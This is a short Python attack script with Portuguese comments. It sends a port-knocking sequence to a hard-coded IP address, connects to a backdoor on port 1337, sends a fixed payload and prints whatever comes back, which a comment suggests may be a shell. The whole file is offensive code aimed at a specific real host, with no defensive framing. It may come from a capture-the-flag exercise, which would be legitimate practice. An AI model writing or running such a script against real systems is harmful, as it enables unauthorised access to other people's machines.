#!/usr/bin/env python3
import socket

TARGET_IP = "37.59.174.235"
PORT_SEQUENCE = [13, 37, 30000, 3000]
BACKDOOR_PORT = 1337

def exploit_backdoor():
    try:
        # 1. Envia sequência de ativação
        for port in PORT_SEQUENCE:
            s = socket.socket()
            s.settimeout(1)
            s.connect_ex((TARGET_IP, port))
            s.close()
        
        # 2. Conecta ao backdoor
        s = socket.socket()
        s.connect((TARGET_IP, BACKDOOR_PORT))
        
        # 3. Envia payload malicioso (26 bytes exatos)
        payload = b"[SYN] SeePS Win=512 Len=9\x00"
        s.send(payload)
        
        # 4. Recebe resposta (opcional)
        print(s.recv(1024))  # Possível shell ou resposta
        
        s.close()
        return True
    except:
        return False

if __name__ == "__main__":
    if exploit_backdoor():
        print("[+] Backdoor explorado com sucesso!")
    else:
        print("[-] Falha na exploração")
